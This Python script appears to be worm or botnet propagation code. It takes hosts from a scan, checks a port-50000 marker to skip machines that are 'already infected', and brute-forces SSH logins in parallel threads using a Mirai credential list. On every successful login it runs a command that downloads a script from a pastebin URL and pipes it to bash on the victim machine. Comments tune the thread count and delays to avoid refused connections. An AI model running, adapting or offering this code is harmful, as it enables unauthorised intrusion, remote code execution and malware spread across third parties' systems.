#! /usr/bin/env python3
        
from threading import Thread
import socket
import time
import subprocess

#function called when dictionary attack found a password
def passwordFoundCallback(password, sharedO):   
    sharedO.setFound(password)
    print ("Found Password for host: " + sharedO.getHost()) #+ " password: " + sharedO.getPassword() + "\n")

class sharedThings():
    def __init__(self, host):
        self.threadCound = 0
        self.found = False
        self.password = ""
        self.host = host
    def incthreadCount(self):
        self.threadCound += 1
    def decthreadCount(self):
        self.threadCound -= 1
    def getthreadCount(self):
        return self.threadCound
    def setFound(self, password):
        self.found = True
        self.password = password
    def isFound(self):
        return self.found
    def getPassword(self):
        return self.password
    def getHost(self):
        return self.host

class BruteForceTask(Thread):
    def __init__(self, host, password, sharedO):
        Thread.__init__(self)
        self.host = host
        self.password = password
        self.sharedO = sharedO

    def run(self):
        try:
            cmd = "setsid sshpass -p \"{0}\" ssh {1} \"wget -q -O - https://pastebin.com/raw/dFrUfqat | tr -d '\\r' | bash\"".format(self.password, self.host)
            subprocess.check_output(cmd, shell=True)
            print("cmd finished: " + cmd)
            passwordFoundCallback(self.password, self.sharedO)
        except:
                pass
        finally:
                #subprocess.check_output(["rm", tempPassFileScript])
                self.sharedO.decthreadCount()

scanOutput = subprocess.check_output(["./scan.py"])
scanOutput = scanOutput.decode("utf-8")
listedNmapString = scanOutput.splitlines()

for ip in listedNmapString:
        host = ip
        dataDecoded = None
        errorOccured = False

        try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socketClient:
                        socketClient.connect((host, 50000))
                        socketClient.sendall('I'.encode('utf-8'))
                        data = socketClient.recv(1024)
                        dataDecoded = data.decode('utf-8')
        except:
                errorOccured = True

        threadLimit = 8 #this is experimentally the highest ive reached without getting connection closed error
        sharedO = sharedThings(host) #used to mimic static variable. Used by processes to notice that they found a password
                                                             #need an instance of sharedThings per attacked Host
        #TODO: ssh root login is disabled on PIONE; Couldnt test PITWO since i cant find it
        if not errorOccured and dataDecoded == 'OK':
                print(ip, 'already infected. Passing to the next one...')
                continue
        
        
         
        print('Found a possible computer to infect. Trying to bruteforce the machine...' + host)
        # we could parallelize each attack on hosts
        # the bottleneck of the technique seems to be the time it takes to receive the answer from the attacked host
        threadArray = []
        with open("./mirai_creds.txt") as f:
                for line in f:
                        username, password = line.split(':')
                        password = password.rstrip()
                        username  = username + "@" + host
                        t = BruteForceTask(username, password, sharedO)
                        t.start()
                        threadArray.append(t)
                        time.sleep(0.05)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
                        #can be a lot faster when executing locally (local: 0.03 vs web: 0.3)

                        sharedO.incthreadCount()
                        while threadLimit < sharedO.getthreadCount():
                                time.sleep(0.01)
                        if sharedO.isFound():
                                break

        for t in threadArray:
            t.join(timeout=1)
        if sharedO.isFound():
                password = sharedO.password
